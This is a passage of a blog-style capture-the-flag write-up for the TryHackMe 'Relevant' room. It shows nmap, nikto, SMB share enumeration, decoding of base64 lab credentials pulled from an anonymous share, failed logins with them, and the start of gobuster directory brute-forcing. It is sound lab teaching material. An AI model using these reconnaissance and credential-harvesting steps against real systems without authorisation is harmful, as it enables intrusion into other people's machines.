@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tzero86@trojanwave/posts/relevant/</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="Relevant_Writeup.sh" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzero86bits.tk/posts/relevant/" /><meta property="article:published_time" content="2020-09-09T20:47:59-04:00" />
+
+
+
+<meta name="twitter:title" content="Relevant_Writeup.sh"/>
+<meta name="twitter:description" content="Welcome to Relevant! We&rsquo;ve been hired by a client that requests a penetration testing assessment before a product go-live date."/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
+              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/relevant'>relevant</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast" >
+        
+<h1>Relevant_Writeup.sh</h1>
+Sep. 9, 2020
+
+
+<br/><br/>
+<img src="../img/relevant_cover2.gif" alt="Post Cover Gif animation";>
+<br/><br/>
+<h2 id="relevant---thm-room">Relevant - THM Room</h2>
+<p>This is another writeup, this time for &lsquo;Relevant&rsquo; TryhackMe&rsquo;s room. This is a writeup detailing all my process to root this room, flaws and all. I embrace mistakes and try to learn from them, therefore this post also includes my failed attempts. You have been warned :)</p>
+<p>PS: I&rsquo;m gonna be adding the penetration testing report for this room soon. I need to put in all the information, vulnerabilities, and any other information that could mimic a real-world report for a pentest assessment. Anyways, thanks for stopping by. Leave a comment, leave your feedback or suggestions. Have a great day!</p>
+<p>Enjoy!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/relevant">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors, and all. They are usually long :laughing:</li>
+</ul>
+<h3 id="introduction-and-scope-of-testing">Introduction and Scope of Testing</h3>
+<p>We&rsquo;ve been hired by a client that requests a penetration testing assessment before a product go-live date.</p>
+<ul>
+<li>The scope is limited to the Room Machine IP only.</li>
+<li>Any Tools are available. However, the client would like us to attempt manual approaches first.</li>
+<li>We need to deliver proof of exploitation by locating two flag values <code>root.txt</code> and <code>user.txt</code></li>
+</ul>
+<p>Additionally, we are encouraged to treat this as a real-world assessment, therefore we&rsquo;ll be generating the penetration testing report as well. Though it will be created after we hack this room and possibly posted in a different writeup since it is a whole process in itself.</p>
+<p>Let&rsquo;s hack!</p>
+<h3 id="enumeration">Enumeration</h3>
+<p>Let&rsquo;s start by running an nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ sudo nmap -A -Pn -p- -T4 10.10.8.249 -oX nmap_results                                                                         <span style="color:#ae81ff">130</span> ⨯
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-09-10 10:26 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.8.249
+Host is up <span style="color:#f92672">(</span>0.38s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65527</span> filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation <span style="color:#ae81ff">14393</span> microsoft-ds
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RELEVANT
+|   NetBIOS_Domain_Name: RELEVANT
+|   NetBIOS_Computer_Name: RELEVANT
+|   DNS_Domain_Name: Relevant
+|   DNS_Computer_Name: Relevant
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-09-10T14:39:09+00:00
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>Relevant
+| Not valid before: 2020-07-24T23:16:08
+|_Not valid after:  2021-01-23T23:16:08
+|_ssl-date: 2020-09-10T14:39:49+00:00; +54s from scanner time.
+49663/tcp open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Device type: general purpose
+Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2012|<span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> or Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+Network Distance: <span style="color:#ae81ff">4</span> hops
+Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h24m54s, deviation: 3h07m51s, median: 53s
+| smb-os-discovery: 
+|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation 6.3<span style="color:#f92672">)</span>
+|   Computer name: Relevant
+|   NetBIOS computer name: RELEVANT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|_  System time: 2020-09-10T07:39:10-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-09-10T14:39:12
+|_  start_date: 2020-09-10T13:55:15
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 135/tcp<span style="color:#f92672">)</span>
+HOP RTT       ADDRESS
+<span style="color:#ae81ff">1</span>   240.07 ms 10.13.0.1
+<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
+<span style="color:#ae81ff">4</span>   378.58 ms 10.10.8.249
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 749.75 seconds
+
+</code></pre></div><p>I&rsquo;m gonna also start a nikto scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ sudo nikto -h 10.10.50.208
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.50.208
++ Target Hostname:    10.10.50.208
++ Target Port:        <span style="color:#ae81ff">80</span>
++ Start Time:         2020-09-10 18:41:22 <span style="color:#f92672">(</span>GMT-4<span style="color:#f92672">)</span>
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-aspnet-version header: 4.0.30319
++ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>                                                    
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST                                                                       
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST                                                                        
++ ERROR: Error limit <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> reached <span style="color:#66d9ef">for</span> host, giving up. Last error: opening stream: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t connect <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>: Operation now in progress
++ Scan terminated:  <span style="color:#ae81ff">19</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">7</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host                                                         
++ End Time:           2020-09-10 19:10:23 <span style="color:#f92672">(</span>GMT-4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1741</span> seconds<span style="color:#f92672">)</span>                                                              
+---------------------------------------------------------------------------
++ <span style="color:#ae81ff">1</span> host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> tested
+
+</code></pre></div><p>And I also try to enum the SMB shares:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ sudo nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.10.91.158                                                                                       <span style="color:#ae81ff">143</span> ⨯
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-09-10 11:34 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.91.158
+Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   <span style="color:#ae81ff">\\</span>10.10.91.158<span style="color:#ae81ff">\A</span>DMIN$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Remote Admin
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   <span style="color:#ae81ff">\\</span>10.10.91.158<span style="color:#ae81ff">\C</span>$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Default share
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   <span style="color:#ae81ff">\\</span>10.10.91.158<span style="color:#ae81ff">\I</span>PC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: Remote IPC
+|     Anonymous access: &lt;none&gt;
+|     Current user access: READ/WRITE
+|   <span style="color:#ae81ff">\\</span>10.10.91.158<span style="color:#ae81ff">\n</span>t4wrksv: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: READ/WRITE
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 85.56 seconds
+
+</code></pre></div><p>We run another scan with nmap to see if the SMB is vulnerable to common vulns:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ nmap --script<span style="color:#f92672">=</span>smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse -p445 10.10.244.137
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-09-10 12:48 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.244.137
+Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.44 seconds
+
+</code></pre></div><p>We have our first lead, the SMB seems vulnerable to CVE-2017-0143. However, we&rsquo;ll continue doing some recon before we attempt to exploit anything. I want to have a better idea of the host we are dealing with.</p>
+<p>We did enum the SMB shares but we did not look into the files on them yet. Let&rsquo;s try that next, I checked all shares and we can anonymously access two of them <code>IPC$</code> and <code>nt4wrksv</code>. The first one didn&rsquo;t have anything useful as far I as could tell. The second one does have a <code>passwords.txt</code> file. I downloaded that file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ smbclient //10.10.50.208/nt4wrksv -U annonymous
+Enter WORKGROUP<span style="color:#ae81ff">\a</span>nnonymous<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">25</span> 17:46:04 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">25</span> 17:46:04 <span style="color:#ae81ff">2020</span>
+  passwords.txt                       A       <span style="color:#ae81ff">98</span>  Sat Jul <span style="color:#ae81ff">25</span> 11:15:33 <span style="color:#ae81ff">2020</span>
+
+                <span style="color:#ae81ff">7735807</span> blocks of size 4096. <span style="color:#ae81ff">5128752</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> cat password.txt
+cat: command not found
+smb: <span style="color:#ae81ff">\&gt;</span> mget passwords.txt
+Get file passwords.txt? y
+getting file <span style="color:#ae81ff">\p</span>asswords.txt of size <span style="color:#ae81ff">98</span> as passwords.txt <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> 
+</code></pre></div><p>When we inspect the file we just downloaded, we see we have some encoded data. Let&rsquo;s try to find out exactly what we are dealing with here:</p>
+<details>
+    <summary>
+      passwords.txt
+      
+    </summary>
+    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>User Passwords - Encoded<span style="color:#f92672">]</span>
+Qm9iIC0gIVBAJCRXMHJEITEyMw<span style="color:#f92672">==</span>
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+</code></pre></div>
+</details>
+<p>I use Cyberchef to try to detect the encoding used on this data, after a first glance we see some format similarities with <code>base64</code> encoding.</p>
+<p><img src="https://i.imgur.com/E9hh9bi.png" alt="posibble base64 encoding"></p>
+<p>Once we use Cyberchef (from Base64 op) we get some credentials:</p>
+<p><img src="https://i.imgur.com/o6pxxJH.png" alt="decoded from base64"></p>
+<details>
+    <summary>
+      Decoded Credentials
+      
+    </summary>
+    <code>Bob - !P@$$W0rD!123Bill - Juw4nnaM4n420696969!$$$</code>
+</details>
+<p>Could we use those credentials to log into the <code>ADMIN$</code> SMB share?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ smbclient //10.10.50.208/ADMIN$ -U Bob       
+Enter WORKGROUP<span style="color:#ae81ff">\B</span>ob<span style="color:#e6db74">&#39;s password: 
+</span><span style="color:#e6db74">tree connect failed: NT_STATUS_ACCESS_DENIED
+</span><span style="color:#e6db74">                                                                                                                                                 
+</span><span style="color:#e6db74">┌──(kali㉿kali)-[~/Documents/THM/relevant]
+</span><span style="color:#e6db74">└─$ smbclient //10.10.50.208/ADMIN$ -U bob                                                                                                   1 ⨯
+</span><span style="color:#e6db74">Enter WORKGROUP\bob&#39;</span>s password: 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+</code></pre></div><p>Hmmm, we get access denied error, maybe it was too good to be true. Let&rsquo;s try the other username and if we don&rsquo;t get access let&rsquo;s continue our enumeration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ smbclient //10.10.50.208/ADMIN$ -U bill                                                                                                  <span style="color:#ae81ff">1</span> ⨯
+Enter WORKGROUP<span style="color:#ae81ff">\b</span>ill<span style="color:#e6db74">&#39;s password: 
+</span><span style="color:#e6db74">tree connect failed: NT_STATUS_ACCESS_DENIED
+</span><span style="color:#e6db74">                                                                                                                                                 
+</span><span style="color:#e6db74">┌──(kali㉿kali)-[~/Documents/THM/relevant]
+</span><span style="color:#e6db74">└─$ smbclient //10.10.50.208/ADMIN$ -U Bill                                                                                                  1 ⨯
+</span><span style="color:#e6db74">Enter WORKGROUP\Bill&#39;</span>s password: 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div><p>I get the same access denied with Bill&rsquo;s user. Let me try real quick to other SMB share <code>C$</code>.
+I&rsquo;ll spare you the reading, that did not work either <code>ACCESS DENIED</code>. So at this point, it is safe to assume those credentials are just decoys to probably try to steer us away from our objective.</p>
+<p>Let&rsquo;s continue our enumeration efforts by running some gobuster on both ports we&rsquo;ve found to be serving a page: <code>80</code> and <code>49663</code>.
+I actually started 3 different scans, each using a different tool and wordlist (not sure how much of a good idea this was). I started Gobuster with a Medium directory wordlist, dirb with the common wordlist, and finally Dirbuster with the small wordlist.</p>
+<p><img src="https://i.imgur.com/WHOpnAO.png" alt="Direcory scans dirb, gobuster and dirbuster"></p>
+<p>Notice all scans are against port <code>49663</code> since I initially ran gobuster on port <code>80</code> and found nothing.</p>
+<p>The first scan to return a directory is the one being run with <strong>dirb</strong>: <code>==&gt; DIRECTORY: http://10.10.36.157:49663/aspnet_client/</code></p>
+<p>After googling a bit it seems to be a default directory created by IIS, not really sure if this points to any possible exploitation here.
+<details>
+    <summary>
+      More info on the **aspnet_client** folder
+      
+    </summary>
+    <ul>
+<li>Check this Stack Overflow Link: <a href="https://stackoverflow.com/questions/210440/what-is-the-aspnet-client-folder-for-under-the-iis-structure">Here</a>.</li>
+</ul>
+
+</details></p>
+<p>We&rsquo;ll take note of this for our report (yep, I&rsquo;m creating the pentest report as well. I&rsquo;ll have that attached to this post don&rsquo;t worry.).</p>
+<p><strong>Dirbuster</strong> did not find anything using the small wordlist, <strong>Gobuster</strong> is still running&hellip;</p>
+<p>15 minutes later we have some <strong>Gobuster</strong> results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ gobuster dir -u http://10.10.36.157:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.36.157:49663
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">40</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2020/09/11 14:40:54 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/dialect: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/homesite: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/alive-proxy: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/geeky: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/msg00263: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/idm: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/Accounting1: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/bizcom: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/mpo: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/PIMs1: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/DesktopThemes1: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/ipg: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/camerashy: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/negroponte: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
